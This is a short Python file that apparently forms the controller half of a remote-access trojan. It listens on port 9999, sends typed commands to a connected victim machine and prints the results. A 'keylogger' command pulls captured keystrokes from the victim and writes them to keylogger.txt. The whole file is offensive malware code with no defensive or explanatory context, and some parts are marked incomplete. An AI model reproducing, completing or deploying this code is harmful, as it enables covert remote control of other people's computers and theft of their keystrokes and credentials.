import socket
import sys
import _thread

def keymode():

    global c

    keyfile=open("keylogger.txt",'w')

    keys=str(c.recv(4096*4),"utf-8")

    keyfile.write(keys)

    print("KEYS: "+keys)

    keyfile.close()

    #incomplete

def keyinterface():

    keymode()

    #incomplete

def smake():

    try:

        global host

        global port

        global s

        host='0.0.0.0'

        port=9999

        s=socket.socket()

    except socket.error as msg:
        print(str(msg))

def sbind():

    try:

        global host

        global port

        global s

        print("Binding to: "+str(port))

        s.bind((host,port))

        s.listen(5)
        
    except socket.error as msg:

        print(str(msg))

def saccept():

    try:

        global c,addr

        c,addr=s.accept()

        print("Connected: "+addr[0]+":"+str(addr[1]))

        passcmd()

        c.close()

    except socket.error as msg:

        print(str(msg))

def passcmd():

    global c

    while True:

        cmd=input()

        if cmd=='quit':

            c.send(str.encode(cmd))

            c.close()

            sys.exit()

        elif cmd[:9]=='keylogger':

            c.send(str.encode(cmd))

            keyinterface()

        elif len(str.encode(cmd))>0:

            c.send(str.encode(cmd))

            crecv=str(c.recv(1024),"utf-8")

            print(crecv, end="")

def main():

    smake()
    sbind()
    saccept()

main()
